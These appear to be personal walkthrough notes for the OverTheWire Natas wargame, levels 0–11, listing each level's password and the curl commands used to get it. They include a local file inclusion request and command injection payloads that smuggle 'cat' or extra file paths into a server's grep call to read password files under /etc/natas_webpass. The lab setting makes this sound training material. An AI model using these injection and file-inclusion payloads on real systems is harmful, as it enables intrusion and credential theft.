
All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

		User Name		    Password
level 0 	natas0			natas0
comamnd ==> curl -u "natas0:natas0" http://natas0.natas.labs.overthewire.org 

level 1		natas1			0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
command ==> curl -u "natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" http://natas1.natas.labs.overthewire.org

level 2		natas2			TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
command ==> curl -u "natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" http://natas2.natas.labs.overthewire.org

level 3		natas3			3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
command ==> curl -u "natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" http://natas2.natas.labs.overthewire.org/files/users.txt | cat

level 4		natas4			QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
note : A robots.txt file is a plain text file that a website uses to communicate with web crawlers and other automated robots. Its primary purpose is to tell these bots which parts of the website they are and are not allowed to access.
command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/robots.txt
command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/s3cr3t/
command ==> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt | cat

level 5 	natas5			0n35PkggAPm2zbEpOU802c0x0Msn1ToK
note: The Referer header is a standard part of an HTTP request that tells the server which page the user was on before they navigated to the current one. The server is checking this header for authorization.
command ==> curl -u "natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/

level 6		natas6			0RoJwHdSKWFTYR5WuiAewauSuNaBXned
note: 	This challenge is about session management. The server is telling you "Access disallowed. You are not logged in," which means it needs some sort of flag to know that you've been authenticated. This flag is almost always a cookie.
	A cookie is a small piece of data that a server sends to a user's web browser and that the browser stores. The browser then sends the cookie back with every subsequent request to that same server.
	Your task is to figure out what cookie the server is looking for and send it with your curl request.
command ==> curl -v -u "natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK" http://natas5.natas.labs.overthewire.org
command ==> curl -u "natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK" -b "loggedin=1" http://natas5.natas.labs.overthewire.org

level 7 	natas7			bmg8SvU1LizuWjx3y7xkNERkHxGre0GS		
note:	The server-side PHP code clearly shows how the password is revealed. It checks if a variable $secret is equal to the value you submit through the form. The $secret variable itself is defined inside the file includes/secret.inc.
	The password is not in the source code; it's the secret value that you need to find. The server is configured to include a separate file, but it may not be configured to prevent you from accessing that file directly.
	Your task is to bypass the form and directly request the includes/secret.inc file to read its contents.

	$secret ="FOEIUWGHFEEUHOFUOIU"
command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/includes/secret.inc
command ==> curl -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=1" http://natas6.natas.labs.overthewire.org


level 8		natas8			xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
note: This level is a classic example of a Local File Inclusion (LFI) vulnerability. The website is using a URL parameter (?page=...) to load content from a file on the server's file system.
command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/
command ==> curl -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

level 9 	natas9			ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
note: 	The PHP code tells you exactly what it's doing: it's taking your input, running it through a series of encoding functions, and checking if the result matches a predefined encoded string.
	you need to reverse the process that the encodeSecret function performs.
	The Breakdown
	The encodeSecret function performs three operations, from inside out:
	1) base64_encode($secret): It first Base64-encodes the secret you provide.
	2) strrev(...): It then reverses the order of the characters in the Base64-encoded string.
	3) bin2hex(...): Finally, it converts the reversed string from its binary representation to a hexadecimal string.
command ==> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
		output: oubWYf2kBq
command ==> curl -u "natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q" -X POST -d "secret=oubWYf2kBq&submit=1" http://natas8.natas.labs.overthewire.org/

level 10 	natas10			t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
note: The vulnerability here is that the website passes our input directly to a shell command without sanitizing it. We can use this to run a second, unauthorized command
Step 1: Send the Request with curl

	curl: This fetches the content of the webpage.

	-s: The silent flag. This hides the progress meter, making the output clean.

	-u "natas9:...": Provides our username and password to authenticate.

	"http://... " (in quotes): The entire URL is quoted to prevent the shell from misinterpreting the & and other special characters.

Step 2: The Command Injection Payload

	?needle=x: We provide a search term (x) to satisfy the server's check that our input is not empty.

	;%20: This is the crucial part. The semicolon ; separates two commands in a shell. The %20 is a URL-encoded space.

	cat /etc/natas_webpass/natas10: This is the command we are injecting. It tells the server to cat (print the contents of) the password file.

	The server's script now executes grep -i x dictionary.txt; cat /etc/natas_webpass/natas10.

Step 3: Filter the Output with grep

	|: The pipe. It takes all the raw HTML output from curl and sends it as input to the grep command.

	grep -oE '[a-zA-Z0-9]{32}': This filters the output.

	-o: Only prints the part of the line that matches our pattern.

	-E: Enables extended regular expressions.

	[a-zA-Z0-9]{32}: The pattern to match. We're looking for any string that is exactly 32 alphanumeric characters long.

command ==> curl -s -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" "http://natas9.natas.labs.overthewire.org/?needle=x;%20cat%20/etc/natas_webpass/natas10&submit=Search" | grep -oE '[a-zA-Z0-9]{32}'

level 11 	natas11			UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
note:	The vulnerability in this level is a command injection that is filtered to block common shell characters (|, &, ;). The solution is to find a way to execute our command without using those characters.

	Step 1:The New Injection Payload

		Instead of chaining commands, we trick the grep command itself. grep can take multiple files to search.

		needle=.: We provide a period (.) as the search pattern. In grep, the period is a wildcard that matches any single character. This is a valid input and bypasses the filter.

		%20/etc/natas_webpass/natas11: The %20 is a URL-encoded space. This space acts as a separator, telling grep that what comes next is a new file to search.
	
	Step 2: How the Server Executes the Command

		The server's code inserts our payload directly, resulting in this command being executed on the server:

		grep -i . /etc/natas_webpass/natas11 dictionary.txt

		The grep command will now search for any character (.) inside both the password file and the dictionary file, and print everything it finds.

	Step 3: Filtering the Output

		|: Pipes the raw HTML and text output from the curl command to grep.

		grep -oE '[a-zA-Z0-9]{32}': This second grep is a local filter that pulls the 32-character password out of all the other text.
	
command ==> curl -u "natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu" "http://natas10.natas.labs.overthewire.org/?needle=.%20/etc/natas_webpass/natas11&submit=Search" | grep -oE '[a-zA-Z0-9]{32}'

